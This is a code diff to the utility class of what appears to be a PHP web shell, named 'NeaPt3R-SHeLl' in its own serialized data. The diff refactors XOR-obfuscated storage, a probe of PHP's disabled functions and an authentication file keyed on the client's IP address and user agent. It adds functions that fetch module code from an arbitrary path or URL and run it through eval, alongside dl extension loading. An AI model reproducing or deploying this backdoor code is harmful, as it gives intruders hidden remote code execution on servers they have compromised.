@@ -36,12 +36,12 @@ class Utils
      * @param  string $sKey  [Optional] Use key
      * @return string        encrypted string
      */
-    public function encrypt($sData, $sKey = NULL)
+    public function encrypt($sData, $sKey = '')
     {
         /**
          * Domyslny klucz
          */
-        if ($sKey === NULL) {
+        if (!$sKey) {
             $sKey = $this->getUniqueKey();
         }
 
@@ -49,18 +49,20 @@ class Utils
          * Musza wystepowac jakies dane
          */
         if (($iDataLen = strlen($sData)) === 0) {
-            return NULL;
+            return '';
         }
 
         $iKeyLen = strlen($sKey);
 
-        $sNewData = NULL;
+        $sNewData = '';
 
         /**
          * Szyfrowanie
          */
         for ($i = 0; $i < $iDataLen; ++$i) {
-            $sNewData .= chr(ord(substr($sData, $i, 1)) ^ ord(substr($sKey, $i % $iKeyLen, 1)));
+            $sNewData .= chr(
+                ord(substr($sData, $i, 1)) ^ ord($sKey[$i % $iKeyLen])
+            );
         }
 
         return $sNewData;
@@ -73,7 +75,7 @@ class Utils
      * @param  string $sKey  [Optional] Use key
      * @return string        decrypted string
      */
-    public function decrypt($sData, $sKey = NULL)
+    public function decrypt($sData, $sKey = '')
     {
         return $this->encrypt($sData, $sKey);
     }
@@ -142,7 +144,13 @@ class Utils
         if (($sDisableFunctions = ini_get('disable_functions')) !== '') {
             $aDisableFunctions = explode(',', $sDisableFunctions);
 
-            $aDisableFunctions = array_map(create_function('$sValue', 'return strtolower(trim($sValue));'), $aDisableFunctions);
+            $aDisableFunctions = array_map(
+                create_function(
+                    '$sValue',
+                    'return strtolower(trim($sValue));'
+                ),
+                $aDisableFunctions
+            );
         }
 
         return $aDisableFunctions;
@@ -213,27 +221,26 @@ class Utils
      */
     public function getCommands()
     {
-        static $aModules;
+        $aModules = array();
 
-        if ($aModules === NULL) {
-            $aModules = array();
+        $aClasses = get_declared_classes();
 
-            $aClasses = get_declared_classes();
+        foreach ($aClasses as $sClass) {
+            if ((strncmp($sClass, 'Module', 6) === 0)
+                && ($sClass !== 'ModuleDummy')
+                && ($sClass !== 'ModuleAbstract')
+            ) {
+                /**
+                 * @todo, Reflection class since PHP 5.3, I should find
+                 * another way to use PHP 5.2.X
+                 */
+                $oReflection = new ReflectionClass($sClass);
 
-            foreach ($aClasses as $sClass) {
-                if ((strncmp($sClass, 'Module', 6) === 0) && ($sClass !== 'ModuleDummy') && ($sClass !== 'ModuleAbstract')) {
-                    /**
-                     * @todo, Reflection class since PHP 5.3, I should find
-                     * another way to use PHP 5.2.X
-                     */
-                    $oReflection = new ReflectionClass($sClass);
+                if ($oReflection->isSubclassOf('ModuleAbstract')) {
+                    $aCommands = $sClass::getCommands();
 
-                    if ($oReflection->isSubclassOf('ModuleAbstract')) {
-                        $aCommands = $sClass::getCommands();
-
-                        foreach ($aCommands as $sCommand) {
-                            $aModules[$sCommand] = $sClass;
-                        }
+                    foreach ($aCommands as $sCommand) {
+                        $aModules[$sCommand] = $sClass;
                     }
                 }
             }
@@ -302,7 +309,7 @@ class Utils
 
         $sValue = 'NeaPt3R-SHeLl_' . serialize($mValue);
 
-        @ file_put_contents($sFile, $this->encrypt($sValue));
+        return (bool) @ file_put_contents($sFile, $this->encrypt($sValue));
     }
 
     public function getAuthFileKey()
@@ -310,4 +317,37 @@ class Utils
         return md5(Request::getServer('REMOTE_ADDR') . Request::getServer('USER_AGENT')) . '_auth';
     }
 
+    public function loadModuleFromLocation($sPath)
+    {
+        if (($sData = @file_get_contents($sPath)) === false) {
+            return false;
+        }
+
+        $this->cacheSet('modules', $sData);
+
+        $this->loadModules();
+
+        return true;
+    }
+
+    public function removeLoadedModules()
+    {
+        $this->cacheSet('modules', '');
+    }
+
+    public function loadModules()
+    {
+        if ($sData = $this->cacheGet('modules')) {
+            ob_start();
+            eval('?>' . $sData . '<?');
+            ob_clean();
+            ob_end_flush();
+        }
+
+        if ($aAutoload = $this->cacheGet('autoload')) {
+            foreach ($aAutoload as $sExtension) {
+                $this->dl($sExtension);
+            }
+        }
+    }
 }
